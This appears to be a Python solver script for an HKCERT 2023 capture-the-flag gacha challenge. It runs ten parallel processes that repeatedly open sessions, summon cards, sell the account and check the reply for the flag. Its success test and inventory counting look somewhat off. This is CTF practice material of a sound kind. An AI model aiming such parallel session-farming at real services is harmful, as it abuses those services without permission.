import requests
import re
import time
import concurrent.futures
# Replace with the actual URL of the CTF challenge
base_url = "http://chal-b.hkcert23.pwnable.hk:28137/"

# Function to parse inventory from the response
def parse_inventory(response_text):
    inventory_info = re.search(r"Current Inventory: Array\s*\((.*?)\)", response_text, re.DOTALL)
    if inventory_info:
        inventory_details = inventory_info.group(1).strip()
        inventory_dict = {}
        for line in inventory_details.split('\n'):
            match = re.match(r'\s*\[([A-Z]+)\] => (\d+)', line)
            if match:
                card_type, count = match.groups()
                inventory_dict[card_type] = int(count)
        return inventory_dict
    return None

# Function to add two inventory dictionaries
def add_inventories(inv1, inv2):
    for key in inv2:
        inv1[key] = inv1.get(key, 0) + inv2[key]
    return inv1

def summon_and_check_inventory(session):
    summon_url = f"{base_url}?gacha10=Summon+10"  # Adjust if necessary for the 'Summon 10' action
    cumulative_inventory = {"UR": 0, "SSR": 0, "SR": 0, "R": 0, "N": 0}

    for i in range(2):  # Two batches of 10 summons each
        response = session.get(summon_url)
        inventory = parse_inventory(response.text)
        #print(inventory)
        if i == 1:
            cumulative_inventory = add_inventories(cumulative_inventory, inventory)
    return cumulative_inventory

# Function to sell the account and retrieve the server response using a session
def sell_account(session):
    sell_url = f"{base_url}?sellacc=true"
    response = session.get(sell_url)
    session.close()
    return response.text

# Function for each process to run the challenge
def run_challenge_in_process():
    while True:
        session = requests.Session()  # Create a new session for each process
        inventory = summon_and_check_inventory(session)
        sell_response = sell_account(session)
        print(f"Server Response: {sell_response}, Inventory: {inventory}")
        if sell_response != '$flag':
            return f"Success! Server Response: {sell_response}, Inventory: {inventory}"
        time.sleep(0.1)  # Adjust the sleep time as needed

# Main function to use multiprocessing
def attempt_challenge_with_multiprocessing():
    with concurrent.futures.ProcessPoolExecutor(max_workers=10) as executor:  # Adjust max_workers as needed
        futures = [executor.submit(run_challenge_in_process) for _ in range(10)]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                return result
    return "No success response found."

# Running the challenge with multiprocessing
success_message = attempt_challenge_with_multiprocessing()
print(success_message)